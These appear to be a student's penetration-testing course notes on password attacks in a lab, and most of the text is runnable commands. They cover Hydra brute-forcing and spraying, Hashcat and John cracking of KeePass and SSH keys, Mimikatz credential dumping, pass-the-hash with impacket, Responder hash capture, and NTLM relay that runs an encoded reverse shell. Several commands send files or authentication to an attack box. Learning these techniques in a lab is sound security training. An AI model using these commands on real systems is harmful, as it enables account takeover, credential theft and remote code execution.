
## 15.1 Attacking Network Service Logons


##### SSH and RDP
- Use hydra to conduct password attack
	- one username -> many passwords
	- specify alt port with -s
	- -l for username
- Can also conduct spray 
	- many usernames -> one password
	- -p for password

Steps
1. Unpack rockyou textfile
2. Run attack (against SSH)
3. Run spray (against RDP)

```
2. sudo hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201

3. sudo hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```


##### HTTP POST Login Form
- Many web services have default user and admin accounts 
- To attack web service, Hydra needs POST data and an example failed login
	- use Burp to capture user/pass fortmat
	- use browser for url subpage and invalid return string
- Example hydra line: sudo hydra -l [usr] -P [wordlist] 192.168.50.201 http-post-form "[login-subpage]:[user/password]:[invalid-return]"
	- sudo hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"

Steps:
1. identify login url
2. start burp
3. send invalid login attempt and capture relevant info
4. send hydra request


```
4. sudo hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```


## 15.2 Password Cracking


##### Cracking Methodology
1. Extract hashes
2. Format hashes
3. Calculate the cracking time
4. Prepare/mutate wordlist
5. Attack the hash


##### Mutating Wordlists
- Password complexity scales cracking time polynomialy 
- Password length scales cracking time exponentially
- Hashcat has cracking benchmarks for each algorithm (hashcat -b)
- Rule-based attack = password brute force with mutated word list
	- Hashcat allows .rule files for mutation
		- each line in a .rule specifies a different variation to be used

Steps:
1. create .rule file
	1. be sure to \ escape special characters (example appends 1, and ! and capitalizes the first letter, then adds second variation with 1 and ! switched)
2. crack with hashcat

```
1. echo "$1 c $!" > attack.rule
1.1 echo "$! c $1" >> attack.rule

2. hashcat -m 0 <hashfile> /usr/share/wordlists/rockyou.txt -r attack.rule --force
``` 


##### Password Managers
- can crack if you obtain the master password hash
	- usually contained in password file on the machine (use google to find file format)

Steps:
1. RDP to the machine
2. Search for the password manager password hash (use google to find file extension)
3. Pull the password hash back to attack box
4. Convert to usable format
	1. Use ssh2john or keepass2john and take out unessecary strings
5. Find password manager hashtype for hashcat
6. Crack 

```
1. xfreerdp /v:192.168.122.203 /u:jason /p:lab /w:1200 /h:700

2. PS> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

3. PS> copy .\Database.kdbx \\<kali_ip>\share\databse.kdbx

4. keepass2john Database.kdbx > keepass.hash

4.1 cat keepass.hash (take out Database: at start)

5. hashcat --help | grep -i "KeePass"

6. hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```


##### Cracking SSH Private Keys
- Usually need to discover id_rsa keys and pull to attack box

Steps:
1. Chmod id_rsa key
2. Convert id_rsa key to crackable format
	1. Remove unecessary string at file start
	2. Identify hash algorithim 
4. Modify rule file for john (example is Captialized, append 137, append ! OR @ OR #)
5. Add rule file to john config
6. Crack with John
7. Login

```
1. chmod 600 id_rsa

2. ssh2john id_rsa > ssh.hash 

2.1 hashcat -h | grep -i "ssh"

3. cat "[List.Rules:sshRules]" > ssh.rule

4. cat "c $1 $3 $7 $!" >> ssh.rule; cat "c $1 $3 $7 $@" >> ssh.rule; cat "c $1 $3 $7 $#" >> ssh.rule

5. john --wordlist=ssh.passwords --rules=sshRules ssh.hash

6. ssh -i id_rsa -p 2222 dave@192.168.50.201

```


## 8.3 Working with Password Hashes 


##### Cracking NTLM
- NTLM hashes not salted
- SAM databse stored in `C:\Windows\system32\config\sam`
	- Windows kernel keeps exclusive lock on the file -> cannot move or modify
- Cracking LSASS requires Administrator and SeDebugPrivilege since LSASS runs as SYSTEM
- Mimikatz can elevate if SeImpersonatePrivilege is enabled 

Steps:
1. Access target via RDP
2. Check local users
3. Run Mimikatz
4. Check Privileges
5. Elevate
6. Dump Credentials
7. Identify correct Hashcat mode
8. Add base64 rule file and crack

```
1.  xfreerdp /v:192.168.122.203 /u:offsec /p:lab /w:1200 /h:700

2. PS> Get-LocalUser

3. PS>.\mimikatz.exe

4. privilege::debug    

5. token::elevate

6. lsadump::sam

6.1 sekurlsa::logonpasswords

7. hashcat --help | grep -i "ntlm"

8. hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```


##### Passsing NTLM
- Can pass NTLM hash if cracking not feasible
	- To leverage for code execution, associated user needs admin privs
- On Windows Vista+ *UAC remote restrictions* denies RCE if not Administrator hash
- Tools for SMB enum and management:
	- smbclient
	- CrackMapExec
- Impacket tools for SMB RCE (install impacket-scripts package)
	- psexec.py
	- wmiexec.py
- Pass the hash also works for RDP and WinRM

Steps:
1. Connect to machine 1 
2. Run mimikatz
3. Verify privs, elevate
4. Dump credentials
5. Use dumped creds to connect to remote SMB share on machine 2
6. Use impacket psexec for RCE
	- Can use wmiexec as well
	- impacket uses LM:NTLM hash format (use 0's for LM)
	- PsExec -> gives SYSTEM
	- WmiExec -> gives *User*


```
3. privilege::debug

3.1 token::elevate 

4. lsadump::sam

5. smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b

6. impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212

6. impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```


##### Cracking Net-NTLMv2
- Net-NTLMv2 is a network authentication method for Windows networks
	- Other option is Kerberos
- Responder is excellent tools for capturing credentials on the wire
	- Protocol capabilities:
		- NTLMv2
		- HTTP
		- FTP
		- LLMNR
		- NBT-NS
		- MDNS
- Can capture NTMv2 by forcing target machine we have access to authenticate with us 
	- Common method is to attempt access to a fake SMB share on our attack machine

Steps:
1. Access target machine 
2. Verify local ip address and start responder locally
3. On remote machine, connect back to a random fake dir
	- Raw hash wil lshow up in responder -> save to .hash file 
4. obtain hash -> verify hash type in hashcat -> crack 

```
1. nc 192.168.50.211 4444

2. ip a
   sudo responder -I tun0

3. dir \\192.168.119.2\randomdir

4. hashcat --help | grep -i "ntlm"
   hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force

```

##### Relaying Net-NTLMv2
- Can relay NTLMv2 hashes if theyre too complex to crack 
- Attack CONOP
	- Authenticate to machine 1 
	- Set up relay server on attack box pointing to machine 2 
	- Force authentication back to attack box
- Use ntlmrelayx from Impacket library for relay attacks 

Steps:
1. Authenticate to machine 1 
2. Start listener on attack box
3. Start relay server on attack box 
	- --no-http-server to disable HTTP if using SMB
	- -smb2support to enable SMB2 functionality 
	- -c quoted command to be run on machine 2   
	- powershell command is a base64 encoded reverse shell
4. From machine 1, force SMB request to attack box

```
1. nc 192.168.50.211 5555

2. nc -nvlp 8080 

3. sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc <base_64_encoded_command>"

4. dir \\192.168.119.2\test
```